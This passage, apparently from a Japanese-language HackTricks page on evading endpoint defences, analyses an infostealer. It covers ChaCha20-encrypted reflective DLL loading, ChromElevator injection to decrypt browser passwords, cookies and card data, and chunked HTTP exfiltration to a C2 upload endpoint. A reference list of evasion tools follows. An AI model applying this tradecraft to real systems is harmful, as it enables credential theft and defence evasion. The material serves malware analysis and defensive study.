- この helper は、ChaCha20（二つの 32 バイト鍵と 12 バイト nonce）で二重に暗号化された第2段階 DLL を保持しています。2回の復号後、blob を reflective にロードし（`LoadLibrary` は使用せず）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` の各 export を呼び出します。<sup>[[25]](#references)</sup>
- ChromElevator のルーチンは、direct-syscall による reflective process hollowing を使って稼働中の Chromium ブラウザーに注入し、AppBound Encryption の鍵を継承します。さらに、ABE の強化策にもかかわらず、SQLite データベースからパスワード、cookie、クレジットカード情報を直接復号します。


### モジュール式のメモリ内収集と分割 HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインタテーブルを反復し、有効なモジュール（Telegram、Discord、Steam、スクリーンショット、ドキュメント、ブラウザー拡張機能など）ごとにスレッドを1つ起動します。各スレッドは共有バッファーに結果を書き込み、約45秒の join 後にファイル数を報告します。
- 完了後、静的リンクされた `miniz` ライブラリを使って、すべてのデータを `%TEMP%\\Log.zip` に圧縮します。続いて `ThreadPayload1` は15秒間スリープし、HTTP POST でアーカイブを10 MBずつ `http://<C2>:6767/upload` に送信します。その際、ブラウザーの `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装します。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が付加され、最後の chunk には `complete: true` が追加され、C2 に再構成の完了を知らせます。

## References

- [1] [高度な回避技法：精密な Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ブログ](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack：マルウェアにもう「無料パス」はない](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – ドキュメント](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – サンプル](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – サンプル](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer の新たな感染チェーンと ConfuserEx ベースの難読化](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – 自分の zero trust を信頼すべきか？Zscaler の posture check を回避する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去のランサムウェア活動を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：転送された export の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 の Forwarded Exports 一覧（apis_fwd.txt）](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library の検索順序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – プロセスのセキュリティとアクセス権](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU リファレンス（MS-PPSEC）](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light（PPL）を活用した EDR 対策](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique で Windows Defender の保護を突破する](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink コマンド リファレンス](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – 純粋なカーテンの裏側：RAT から builder、そして coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer がやって来る：意欲的な新型 infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption の復号](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API tracing による Node.js malware の無力化](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [眠れる美女：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [眠れる美女 II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW を隠す](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team 運用での Chrome Remote Desktop の悪用：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の remediation driver を kernel operation primitive として兵器化する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：LLVM を使った self-masking function の作成](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
